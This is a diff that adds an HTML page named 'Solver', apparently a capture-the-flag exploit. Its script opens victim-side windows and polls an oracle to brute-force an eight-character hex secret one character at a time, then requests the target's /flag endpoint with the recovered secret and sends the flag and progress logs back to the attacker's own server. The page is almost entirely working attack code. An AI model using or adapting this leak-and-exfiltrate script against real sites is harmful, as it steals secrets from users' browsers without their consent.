@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solver</title>
+</head>
+<body>
+<script type="module">
+async function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function log(msg) {
+    console.log(msg);
+    await fetch(`/log?msg=${encodeURIComponent(msg)}`);
+}
+
+async function oracle(guess) {
+    const w = window.open(`/start?guess=${encodeURIComponent(guess)}`);
+
+    let done = false;
+    let result;
+    while (!done) {
+        const res = await fetch(`/get?key=${encodeURIComponent(guess)}`);
+        result = await res.text();
+        console.log(guess, result);
+        done = result.length !== 0;
+    }
+
+    return result === 'true';
+}
+
+const TARGET = '$TARGET$';
+
+const alpha = '0123456789abcdef';
+const BATCH_SIZE = alpha.length / 2;
+
+let nonce = '';
+while (nonce.length !== 8) {
+    let results = Array(alpha.length).fill(false);
+
+    let curr = 0;
+    for (let i = 0; i < alpha.length; i += 1) {
+        const guess = nonce + alpha[i];
+        results[i] = oracle(guess);
+        curr++;
+
+        if (curr >= BATCH_SIZE) {
+            results = await Promise.all(results);
+            curr = 0;
+        }
+
+        if (results.indexOf(true) !== -1) {
+            break;
+        }
+    }
+
+    const idx = results.indexOf(true);
+    if (idx === -1 || results.filter(value => value).length !== 1) {
+        // Defensive check for debugging.
+        await log(results);
+        break;
+    }
+
+    nonce += alpha[idx];
+    await log(nonce);
+}
+
+if (nonce.length === 8) {
+    const res = await fetch(`${TARGET}/flag?secret=${nonce}`);
+    const flag = await res.text();
+    await fetch(`/flag?flag=${encodeURIComponent(flag)}`);
+}
+</script>
+</body>
+</html>
